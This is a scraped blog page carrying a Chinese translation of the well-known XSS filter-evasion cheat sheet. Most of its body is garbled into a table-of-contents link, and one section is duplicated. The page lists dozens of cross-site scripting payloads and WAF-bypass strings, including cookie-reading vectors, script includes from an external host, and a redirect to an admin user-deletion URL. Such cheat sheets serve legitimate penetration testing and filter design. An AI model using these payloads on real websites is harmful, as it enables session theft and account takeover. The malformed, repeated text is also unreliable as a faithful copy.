                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
            
        
    
        
            
                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title="wechat">
                  
                  <img class="profile-qr" src="/assets/example_qr.png">
                </span>
            
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
        
        
        <span id="busuanzi_container_site_pv" class="theme-info">
            &nbsp;|&nbsp;&nbsp;总访问量&nbsp;<span id="busuanzi_value_site_pv">&nbsp;</span>次
        </span>
        <span id="busuanzi_container_site_uv" class="theme-info">
            &nbsp;&nbsp;|&nbsp;&nbsp;访客数&nbsp;<span id="busuanzi_value_site_uv">&nbsp;</span>人次&nbsp;&nbsp;|
        </span>
        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
        
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#译文源起"><span class="toc-number">1.</span> <span class="toc-text">译文源起</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#译者说明"><span class="toc-number">2.</span> <span class="toc-text">译者说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#介绍"><span class="toc-number"></span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试说明"><span class="toc-number"></span> <span class="toc-text">测试说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS漏洞挖掘"><span class="toc-number">1.</span> <span class="toc-text">XSS漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS漏洞挖掘2"><span class="toc-number">2.</span> <span class="toc-text">XSS漏洞挖掘2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#没有任何过滤的利用"><span class="toc-number">3.</span> <span class="toc-text">没有任何过滤的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见通用XSS绕过利用代码"><span class="toc-number">4.</span> <span class="toc-text">常见通用XSS绕过利用代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用image标签执行Java-Script命令"><span class="toc-number">5.</span> <span class="toc-text">利用image标签执行Java Script命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对屏蔽引号和分号的绕过"><span class="toc-number">6.</span> <span class="toc-text">对屏蔽引号和分号的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#敏感字符检测的绕过"><span class="toc-number">7.</span> <span class="toc-text">敏感字符检测的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML实体转义"><span class="toc-number">8.</span> <span class="toc-text">HTML实体转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用反引号混淆绕过"><span class="toc-number">9.</span> <span class="toc-text">利用反引号混淆绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#标签的畸形用法"><span class="toc-number">10.</span> <span class="toc-text">\标签的畸形用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#标签的畸形用法-1"><span class="toc-number">11.</span> <span class="toc-text">\标签的畸形用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用fromCharCode方法绕过引号限制"><span class="toc-number">12.</span> <span class="toc-text">利用fromCharCode方法绕过引号限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用SRC默认属性绕过-SRC域检测限制"><span class="toc-number">13.</span> <span class="toc-text">利用SRC默认属性绕过,SRC域检测限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#将SRC默认值为空"><span class="toc-number">14.</span> <span class="toc-text">将SRC默认值为空.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完全不设置SRC属性"><span class="toc-number">15.</span> <span class="toc-text">完全不设置SRC属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于erro事件触发"><span class="toc-number">16.</span> <span class="toc-text">基于erro事件触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IMG-onerror-和-Java-script编码绕过"><span class="toc-number">17.</span> <span class="toc-text">IMG onerror 和 Java script编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#十进制在html代码中运用"><span class="toc-number">18.</span> <span class="toc-text">十进制在html代码中运用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#十进制且不带分号在html代码中运用"><span class="toc-number">19.</span> <span class="toc-text">十进制且不带分号在html代码中运用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#十六进制且不带分号在html代码中运用"><span class="toc-number">20.</span> <span class="toc-text">十六进制且不带分号在html代码中运用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用TAB绕过"><span class="toc-number">21.</span> <span class="toc-text">使用TAB绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对编码的TAB进行绕过"><span class="toc-number">22.</span> <span class="toc-text">对编码的TAB进行绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用换行符来拆解XSS"><span class="toc-number">23.</span> <span class="toc-text">利用换行符来拆解XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用回车编码去拆解XSS"><span class="toc-number">24.</span> <span class="toc-text">利用回车编码去拆解XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Null空字符分割javascript指令"><span class="toc-number">25.</span> <span class="toc-text">Null空字符分割javascript指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用图像元素中Javascript的空格来绕过"><span class="toc-number">26.</span> <span class="toc-text">利用图像元素中Javascript的空格来绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#非字母非数字型XSS"><span class="toc-number">27.</span> <span class="toc-text">非字母非数字型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#多重尖括号"><span class="toc-number">28.</span> <span class="toc-text">多重尖括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#没有标签绕过"><span class="toc-number">29.</span> <span class="toc-text">没有标签绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Script标签中协议解析绕过"><span class="toc-number">30.</span> <span class="toc-text">Script标签中协议解析绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS"><span class="toc-number">31.</span> <span class="toc-text">利用标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS-1"><span class="toc-number">32.</span> <span class="toc-text">利用标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS-2"><span class="toc-number">33.</span> <span class="toc-text">利用标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签的Dynsrc属性进行XSS"><span class="toc-number">34.</span> <span class="toc-text">利用标签的Dynsrc属性进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签的Lowsrc属性进行XSS"><span class="toc-number">35.</span> <span class="toc-text">利用标签的Lowsrc属性进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签中的VBscript命令进行XSS"><span class="toc-number">36.</span> <span class="toc-text">利用标签中的VBscript命令进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用Livescript命令进行XSS-只适用老版本Netscape"><span class="toc-number">37.</span> <span class="toc-text">利用Livescript命令进行XSS(只适用老版本Netscape)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用SVG的标签进行XSS"><span class="toc-number">38.</span> <span class="toc-text">利用SVG的标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于ECMAScript-6的XSS"><span class="toc-number">39.</span> <span class="toc-text">基于ECMAScript 6的XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签ONLOAD属性进行XSS"><span class="toc-number">40.</span> <span class="toc-text">利用标签ONLOAD属性进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于事件句柄-或称为-事件处理器"><span class="toc-number">41.</span> <span class="toc-text">基于事件句柄(或称为:事件处理器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-lt-BGSOUND-gt-标签进行XSS"><span class="toc-number">42.</span> <span class="toc-text">利用&lt; BGSOUND &gt;标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-amp-JavaScript-includes方法进行XSS"><span class="toc-number">43.</span> <span class="toc-text">利用&amp; JavaScript includes方法进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用样式表标签进行XSS"><span class="toc-number">44.</span> <span class="toc-text">利用样式表标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用远程样式表进行XSS"><span class="toc-number">45.</span> <span class="toc-text">利用远程样式表进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用远程样式表进行XSS-part-2"><span class="toc-number">46.</span> <span class="toc-text">利用远程样式表进行XSS part 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用远程样式表进行XSS-part-3"><span class="toc-number">47.</span> <span class="toc-text">利用远程样式表进行XSS part 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用远程样式表进行XSS-part-4"><span class="toc-number">48.</span> <span class="toc-text">利用远程样式表进行XSS part 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签来分解XSS-payload"><span class="toc-number">49.</span> <span class="toc-text">利用标签来分解XSS payload&lt;/h2&gt;&lt;p&gt;此payload有时会将IE浏览器中造成无限循环.&lt;/p&gt;
&lt;p&gt;   &lt;STYLE&gt;@im\port’\ja\vasc\ript:alert(“XSS”)’;   
利用style属性配合注释符来分解XSS payload由Roman Ivanov创建.
      

利用标签进行分解XSS payload 增强版&lt;/h2&gt;&lt;p&gt;这与上述XSS payload混合,但他确实展现了&lt;style&gt;标签被分隔解析是多困难.同样它也会在IE下造成无限弹窗.&lt;/p&gt;
&lt;p&gt;   exp/&lt;em&gt;&amp;lt;A   STYLE=’no\xss:noxss(“&lt;/em&gt;//&lt;em&gt;“);   xss:ex/&lt;/em&gt;XSS&lt;em&gt;//&lt;/em&gt;/*/pression(alert(“XSS”))’&amp;gt;   &lt;/p&gt;
&lt;h2 id=&quot;利用标签-仅限于老版本Netscape&quot;&gt;&lt;a href=&quot;#利用标签-仅限于老版本Netscape&quot; class=&quot;headerlink&quot; title=&quot;利用标签(仅限于老版本Netscape)&quot;&gt;&lt;/a&gt;利用&lt;STYLE&gt;标签(仅限于老版本Netscape)&lt;/h2&gt;   &lt;STYLE   TYPE=&quot;text/javascript&quot;&gt;alert(‘XSS’);   

利用标签的background-image属性进行XSS&lt;/h2&gt;   &lt;STYLE&gt;.XSS{background-image:url(“javascript:alert(‘XSS’)”);}## 利用标签的background属性进行XSS&lt;br&gt;&lt;br&gt;   &lt;STYLE   type=&quot;text/css&quot;&gt;BODY{background:url(“javascript:alert(‘XSS’)”)}   

利用具有style属性的匿名的HTML标签进行XSSIE渲染引擎模式中IE6.0和Netscape8.1+并不关系你创建的html标签是否存在,只要它是以&lt;&gt;全开括号和字母开头就行;
      

利用本地HTC文件进行XSS这跟上述两个XSSpayload有点不同,因为它使用的.htc文件必须与XSS payload在同一域内.示例文件通过写入Javascript并利用style属性来运行;
      

US-ASCII编码US-ASCII编码(由于Kurt Huwig发现).这里使用7位代替8位,该XSS payload可以绕过很多基于内容检测的过滤器,但仅限于主机上使用US-ASCII编码传输或者你设置为此编码时才起作用.这对于WEB应用防火墙XSS过滤比对服务器端过滤绕过更有用.已知Apache Tomcat目前唯一以US-ASCII编码传输的服务器.
   ¼script¾alert(¢XSS¢)¼/script¾   
利用&lt; META &gt;标签进行XSS利用奇怪之处在于它不会在http头中发送引用referrer,因此它可以用用于某些类型攻击,你需要避免引入URL:
      

利用标签的content属性进行XSS这种方案其实很不错,因为他没有任何明显的script或者Javascript指令,因为它使用base64编码.具体请参考RFC 2397了解更多详情,或者访问此处XSS编码器对你的XSSpaylod进行base64编码.
      

利用标签的带URL参数进行XSS绕过如果目标网站尝试检查URL是否包含http://,那么你可以使用以下payload来绕过它.( 由于Moritz Naumann提出);
      

利用标签进行XSS如果目标网站允许,那么会产生很多XSS问题.
      

利用事件触发标签的XSSIframes还有大多数其他元素可以使用像一下基于事件来进行混淆(由于David Cross提交.)
      

利用进行XSS与存在相同的问题.
      

利用标签进行XSS      

利用标签进行XSS如图上面所述,也容易受到包含Javascript的XSS payload攻击.
      
利用标签在DIV中使用background-image属性完成XSS      

使用background-image属性配合unicoded编码完成XSS这只是稍微修改去混淆下URL参数.它最早被Renaud Lifchitz发现用于攻击hotmaill;
      

使用background-image属性加上额外字符完成XSSRnaske建立了一个快速的XSS Fuzzer来检测半开扩号后允许的字符,但在安全的站点模式下IE和Netscape8.1中Javascript命令之前.这些都是十进制的,但当然可以利用十六进制进行填充.(可以使用以下任意字符: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)
      

利用DIV表达式完成XSS这个payload稍微修改下在冒号和” expression”中间加入一个换行符,可以非常有效绕过真实的XSS防护.
      

利用IE注释块进行XSS绕过尽在IE5.0及以上版本和使用IE渲染引擎模式的Netscape下有效.一些网站认为在注释内的内容是安全的,因此不需要移除.或者系统能够在页面某些部分添加注释标签，从而让它们失去有害性.如我们所知,这些操作(把内容注释掉的操作)可能是于事无补的:
      
利用标签进行XSS这在IE和Netscape8.1的安全模式下能起作用.你需要使用//注释掉下一个字符,避免JavaScript错误,从而让我们的XSS攻击向量正常执行.这也依赖于一个条件:网站图像使用相对地址如”images/image.jpg”,而非绝对地址.如果地址中包含了斜杠(“/images/image.jpg”)，你可以在XSS payload移除一个:
      

利用标签进行XSS如果页面允许标签,你甚至可以在页面挂马.下面链接指向的文件是一个可以包含你的XSS payload的HTML文件;
      

使用标签嵌入一个包含XSS的Flash动画如果你添加allowScriptAccess=“never”和allownetworking=”internal”属性,可以减轻这种风险(感谢Jonathan Vanasco提供信息);
   EMBED SRC=”http://ha.ckers.Using an   EMBED tag you can embed a Flash movie that contains XSS. Click here for a   demo. If you add the attributes allowScriptAccess=”never” and   allownetworking=”internal” it can mitigate this risk (thank you to   Jonathan Vanasco for the info).:   org/xss.swf”   AllowScriptAccess=”always”&gt;   
你可以嵌入包含XSS payload的SVG这个例子只在Firefox下有效，但它比上面的攻击向量要好一些，因为这不需要用户安装或开启Flash（感谢nEUrOO提供）：
      

使用ActionScript来混淆你的XSS payload   a=”get”;   b=”URL(\””;   c=”javascript:”;   d=”alert(‘XSS’);\”)”;   eval(a+b+c+d);   
利用XML数据与CDATA区段混淆进行XSS这个XSS payload仅限于IE和Netscape8.1中的IE渲染引擎中工作(由于Sec Consult在对yahoo进行审计时候发现这个payload)
         
利用XML的embedded方法在本地XML中嵌入Javascript这与上述相同,在本地托管(必须在同一台服务器上)包含你的XSS payload的XML文件.具体看示例;
         
利用XML中加入HTML+Time元素完成XSS这就是Grey Magic攻击hotmail和yahoo!的方法,这仅限于IE和Netscape8.1中使用,并记住,需要在HTML和标签之间使用;
      &lt;?xml:namespace prefix=”t”   ns=”urn:schemas-microsoft-com:time”&gt;   &lt;?import namespace=”t”   implementation=”#default#time2”&gt;   &lt;t:set attributeName=”innerHTML”   to=”XSSalert(“XSS”)“&gt;      

通过简单修改字符去绕过过滤器对”.js”的过滤可以将XSS payload的Javascript文件重命名为图片文件命名规则.
      

SSI(服务端包含)进行XSS这需要在服务器上安装SSI,这样才能使用这个XSS payload.可能不需要提及这一种攻击方法,如果攻击者可以在服务器上执行命令,那么这个安全问题就更严重了.
      
利用PHP完成XSS需要在服务器上安装php才能使用XSS payload.再次提醒下,如果你可以像这样远程运行任意脚本,那么可能有更多可怕的安全问题;
   &lt;? echo(‘&lt;SCR)’;   echo(‘IPT&gt;alert(“XSS”)‘);   ?&gt;   
利用IMG标签嵌入命令执行XSS它是需要用户认证后才可以执行命令的当前域页面。它将可以用于创建或者删除用户（如果访问者是管理员），或是在其他地方发送凭证等等，虽然较少被使用,但非常有效的。
译者注:可以理解为类似CSRF那种操作.
      









利用IMG标签嵌入命令执行XSS part II这是一种更加可怕地攻击,因为没有看起来可以区别的标示符,而且它也不用放在被攻击者网站上.攻击向量使用302或304来跳转图片到一个命令地址.一个正常的能够成为一个攻击工具,来执行相应的攻击命令.下面一个在Apache上的用来进行攻击的.htaccess文件的内容(感谢Timo提供)::
   Redirect 302 /a.jpg   http://victimsite.com/admin.asp&amp;deleteuser   
Cookie篡改我承认这是一种很隐蔽的攻击方式,但我曾经见过一些示例:页面允许标签,你可以用它来覆盖cookie.还有一些其他的示例:页面不是从数据库中取用户名,而是从cookie中读取.这两个场景相结合的情况下,你可以修改受害者的cookie,让你的XSS payload可以在页面上执行(同样你可以用它来改变用户状态，让它们以你的身份登录等):
      

利用UTF-7编码进行XSS如果页面存在XSS并且没有提供页面编码或者浏览器设置为UTF-7编码,页面就能遭到这种攻击（感谢Roman Ivanov）.在现代浏览器中,除非修改编码类型,否则这种攻击是不会产生的(Watchfire在google的404脚本中发现了这个漏洞)
      +ADw-SCRIPT+AD4-alert(‘XSS’);+ADw-/SCRIPT+AD4-   
使用HTML引用封装进行XSS这个在IE测试过,视情况而定.对于允许””标签,但不允许通过”&amp;lt;SCRIPT SRC…”(正则表达式为:”/&amp;lt;script[^&amp;gt;]+src/I”),这种情况就可以考虑下此payload;&lt;/p&gt;
   &lt;SCRIPT a=&quot;&gt;&quot;   SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;   

对于允许””标签,但不允许”&lt;script src …&gt;”站点上执行XSS payload正则表达式为&lt;/p&gt;
&lt;p&gt;” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)&lt;em&gt;?”|’(.)&lt;/em&gt;?’|[^’”&amp;gt;\s]+))?)+\s&lt;em&gt;|\s&lt;/em&gt;)src/i”,(这个很重要,因为这种正则匹配很常见.)&lt;/p&gt;
   &lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;   

另外一个绕过类似这种正则过滤绕过,XSS payload.
(” /&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”)
      

最后一种绕过这种正则过滤,XSS payload,使用重音符(它无法在firefox下使用).正则表达式为:
“/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”;
   `   SRC=”httx://xss.rocks/xss.js”&amp;gt;   

这个XSS paylodad,会引起正则表达式不会匹配引号,同时发现会引起不正确的终止字符串.
      

一个令人担忧的XSS payload这种XSS payload让我很担忧,因为它几乎无法防御,除非禁用所有动态内容.
   document.write(“&amp;lt;SCRI”);PT   SRC=”httx://xss.rocks/xss.js”&gt;   

URL字符串绕过假定页面不允许出现http://www.google.com/;
利用IP代替域名   XSS   

利用URL编码   XSS   

利用双字节编码(注意:还有其他双字节编码方式,具体可以通过后面的IP混淆计算器来获取更多信息)
   XSS   

利用十六进制编码你可以在第2个数字看出来,每个数字允许的总大小在240之内.16进制的值是介于0~F之间的.从第3个数字看,前导0的也是不需要的:
   XSS   

利用八进制编码你可以填充0,但是要保证每个“数字”都不小于4个字符:
   XSS   



利用混合编码我们混合并匹配基本编码,添加一些制表符和换行符.这些符号需要包含在引号内才起作用.
   XSS   

利用协议解析绕过(//转换为http://能节省一些字符).当空间成为问题时,这是非常方便的方法.也能绕过类似于”(ht|f)tp(s)?://“的正则(感谢Ozh的提供).你可以将”//“改为”\”.你需要保证斜杠在准确的位置,否则有可能被当成一个相对路径.
   XSS   

利用Google”手气不错” part 1Firefox使用Google的手气不错功能来根据用户键入的关键字跳转到对应的网站.如果你的攻击页面在一些随机关键词的顶部,你可以使用这个特性来攻击Firefox用户.这利用了Firefox的“keyword:”协议.你可以通过使用若干关键词来达到目的:”keyword:XSS+RSnake”,这在Firefox2.0版本不再有效.
   XSS   

利用Google”手气不错” part 2这里使用了一个只有Firefox支持的小窍门.因为它是基于手气不错功能开发的.这个不支持opera，因为opera认为这是一个利用HTTP基本认证的网络钓鱼攻击.事实上它仅仅是一个畸形的URL.如果你单击这个链接的话,它就会产生作用.不过这个特性在Firefox2.0之后的版本也不支持了:
   XSS   

利用Google”手气不错” part 3这是一个畸形的Url,只能在Firefox和Opera中起作用.因为它们是基于手气不错功能实现的, 像上面的例子一样,它们需要你的网站在谷歌搜索中排名第一(例如google):
   XSS   

利用删除cnames结合上面的URL，移除www能节省4个字节：
   XSS   

利用额外点绕过   XSS   

利用Javascript链接地址   XSS   

利用内容替换的payload假定”http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子(IE: “java	script:”被转换为”java script:”,这在IE、安全模式下的Netscape 8.1+和Opera是有效的);
   XSS   





































字符转义表下面是&lt;字符在HTML和Javascript中所有组合.大多数不会被浏览器直接执行.但是在很多能够在上述某些特定情况下使用.
   &lt;    %3C   &amp;lt   &lt;   &amp;LT   &lt;   &amp;#60   &amp;#060   &amp;#0060   &amp;#00060   &amp;#000060   &amp;#0000060   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#x3c   &amp;#x03c   &amp;#x003c   &amp;#x0003c   &amp;#x00003c   &amp;#x000003c   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#X3c   &amp;#X03c   &amp;#X003c   &amp;#X0003c   &amp;#X00003c   &amp;#X000003c   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#x3C   &amp;#x03C   &amp;#x003C   &amp;#x0003C   &amp;#x00003C   &amp;#x000003C   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#X3C   &amp;#X03C   &amp;#X003C   &amp;#X0003C   &amp;#X00003C   &amp;#X000003C   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   \x3c   \x3C   \u003c   \u003C   
针对跨站脚本攻击-绕过WAF的方法一般问题
l  存储型XSS
如果攻击者绕过过滤器发起XSS攻击,WAF将无法防御攻击
l  反射型XSS
   Example:  … setTimeout(\”writetitle()\”,$_GET[xss])   …    Exploitation: /?xss=500);   alert(document.cookie);//   
基于DOM型XSS
   Example:  …   eval($_GET[xss]); …    Exploitation: /?xss=document.cookie   
XSS请求重定向容易受攻击代码:
   …    header(‘Refresh: 0; URL=’.$_GET[‘param’]);   …   
l  此请求WAF将会被拦截
   /?param=javascript:alert(document.cookie)   
l  利用编码将绕过WAF,并会在某些浏览器中执行XSS paylod.
   /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=   
针对XSS bypass WAF的字符串                   “&gt;”&gt;’&gt;alert(String.fromCharCode(88,83,83))   “&gt;   “&gt;               &lt;iframe/src=”data:text/html,“&gt;      &lt;script   xlink:href=data:,window.open(‘https://www.google.com/&#39;)&gt;&lt;/script         X   &lt;img/%00/src=”worksinchrome:prompt(1)”/%00/onerror=’eval(src)’&gt;   //*{x:expression(alert(/xss/))}//&lt;style&gt;      On Mouse Over   &lt;img src=”/“ =_=”   title=”onerror=’prompt(1)’”&gt;   ClickMe    alert(1) &amp;lt;/script 1=2   &lt;form&gt;&lt;button   formaction=javascript&amp;colon;alert(1)&gt;CLICKME   &amp;lt;input/onmouseover=”javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;”   &lt;iframe   src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;   &lt;/p&gt;
&lt;h2 id=&quot;利用混淆绕过过滤器&quot;&gt;&lt;a href=&quot;#利用混淆绕过过滤器&quot; class=&quot;headerlink&quot; title=&quot;利用混淆绕过过滤器&quot;&gt;&lt;/a&gt;利用混淆绕过过滤器&lt;/h2&gt;&lt;p&gt;   (alert)(1)   a=alert,a(1)   [1].find(alert)   top&lt;a href=&quot;1&quot;&gt;“al”+”ert”&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;/al/.source+/ert/.source&lt;/a&gt;   al\u0065rt(1)   top&lt;a href=&quot;1&quot;&gt;‘al\145rt’&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;‘al\x65rt’&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;8680439..toString(30)&lt;/a&gt;   &lt;/p&gt;
&lt;h1 id=&quot;作者和主编&quot;&gt;&lt;a href=&quot;#作者和主编&quot; class=&quot;headerlink&quot; title=&quot;作者和主编&quot;&gt;&lt;/a&gt;作者和主编&lt;/h1&gt;&lt;p&gt;Robert “RSnake” Hansen&lt;/p&gt;
&lt;h1 id=&quot;贡献者&quot;&gt;&lt;a href=&quot;#贡献者&quot; class=&quot;headerlink&quot; title=&quot;贡献者&quot;&gt;&lt;/a&gt;贡献者&lt;/h1&gt;&lt;p&gt;Adam Lange&lt;/p&gt;
&lt;p&gt;Mishra Dhiraj其他备忘录&lt;/p&gt;
&lt;p&gt;就不一样介绍了,详情请访问&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series&quot;&gt;https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;#_ftnref1&quot;&gt;[1]&lt;/a&gt; XSS过滤绕过备忘单-&lt;a href=&quot;http://cheatsheets.hackdig.com/?4.htm&quot;&gt;http://cheatsheets.hackdig.com/?4.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#_ftnref3&quot;&gt;[3]&lt;/a&gt; 不止有TAB,而且空格键也可以,并且可以利用两个空格来代替一个空格进行绕过测试.&lt;/p&gt;
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用style属性配合注释符来分解XSS-payload"><span class="toc-number">50.</span> <span class="toc-text">利用style属性配合注释符来分解XSS payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行分解XSS-payload-增强版"><span class="toc-number">51.</span> <span class="toc-text">利用标签进行分解XSS payload 增强版&lt;/h2&gt;&lt;p&gt;这与上述XSS payload混合,但他确实展现了&lt;style&gt;标签被分隔解析是多困难.同样它也会在IE下造成无限弹窗.&lt;/p&gt;
&lt;p&gt;   exp/&lt;em&gt;&amp;lt;A   STYLE=’no\xss:noxss(“&lt;/em&gt;//&lt;em&gt;“);   xss:ex/&lt;/em&gt;XSS&lt;em&gt;//&lt;/em&gt;/*/pression(alert(“XSS”))’&amp;gt;   &lt;/p&gt;
&lt;h2 id=&quot;利用标签-仅限于老版本Netscape&quot;&gt;&lt;a href=&quot;#利用标签-仅限于老版本Netscape&quot; class=&quot;headerlink&quot; title=&quot;利用标签(仅限于老版本Netscape)&quot;&gt;&lt;/a&gt;利用&lt;STYLE&gt;标签(仅限于老版本Netscape)&lt;/h2&gt;   &lt;STYLE   TYPE=&quot;text/javascript&quot;&gt;alert(‘XSS’);   

利用标签的background-image属性进行XSS&lt;/h2&gt;   &lt;STYLE&gt;.XSS{background-image:url(“javascript:alert(‘XSS’)”);}## 利用标签的background属性进行XSS&lt;br&gt;&lt;br&gt;   &lt;STYLE   type=&quot;text/css&quot;&gt;BODY{background:url(“javascript:alert(‘XSS’)”)}   

利用具有style属性的匿名的HTML标签进行XSSIE渲染引擎模式中IE6.0和Netscape8.1+并不关系你创建的html标签是否存在,只要它是以&lt;&gt;全开括号和字母开头就行;
      

利用本地HTC文件进行XSS这跟上述两个XSSpayload有点不同,因为它使用的.htc文件必须与XSS payload在同一域内.示例文件通过写入Javascript并利用style属性来运行;
      

US-ASCII编码US-ASCII编码(由于Kurt Huwig发现).这里使用7位代替8位,该XSS payload可以绕过很多基于内容检测的过滤器,但仅限于主机上使用US-ASCII编码传输或者你设置为此编码时才起作用.这对于WEB应用防火墙XSS过滤比对服务器端过滤绕过更有用.已知Apache Tomcat目前唯一以US-ASCII编码传输的服务器.
   ¼script¾alert(¢XSS¢)¼/script¾   
利用&lt; META &gt;标签进行XSS利用奇怪之处在于它不会在http头中发送引用referrer,因此它可以用用于某些类型攻击,你需要避免引入URL:
      

